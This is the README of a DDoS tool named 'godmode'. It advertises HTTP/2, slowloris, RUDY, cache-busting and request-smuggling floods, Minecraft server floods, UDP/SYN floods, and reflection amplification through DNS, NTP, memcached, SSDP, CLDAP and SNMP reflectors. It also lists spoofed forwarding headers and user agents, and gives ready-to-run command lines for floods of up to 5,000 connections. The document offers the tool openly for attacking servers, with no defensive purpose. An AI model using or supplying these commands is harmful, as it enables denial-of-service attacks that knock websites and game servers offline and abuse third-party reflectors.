# godmode

Ultimate L7 + Minecraft game DDoS tool with full spoofing + amplification.

## L7 methods
http, h2rapid, slowloris, rudy, websocket, cachebust, cookiebomb, tlshandshake, quic, smuggle

## Minecraft methods
mc_status, mc_login, mc_ping, mc_bedrock, mc_legacy

## Generic
udp, syn, connect

## Amplification (needs --reflectors)
dnsamp, ntpamp, memamp, ssdpamp, cldapamp, snmpamp

## Spoofing
- Source IP rotation (X-Forwarded-For, X-Real-IP, CF-Connecting-IP, True-Client-IP, etc.)
- 10 rotating User-Agents, languages, accept headers
- Minecraft: spoofed player name, protocol version, UUID
- TLS: randomized ClientHello (handshake flood)

## Usage
```bash
# L7 HTTP flood
python3 godmode.py example.com -p 443 -c 1000 -d 120 -m http --ssl --confirm

# Minecraft status flood
python3 godmode.py mc.example.com -p 25565 -c 500 -d 120 -m mc_status --confirm

# Full combo
python3 godmode.py example.com -p 443 -c 2000 -d 300 -m http h2rapid slowloris rudy websocket cachebust --ssl --confirm

# Amplification (needs reflector list)
python3 godmode.py target.com -m dnsamp ntpamp memamp --reflectors amp_list.txt -c 5000 -d 300 --confirm
```

## Install
```bash
pip install aiohttp
# optional: uvloop for speed
pip install uvloop
```
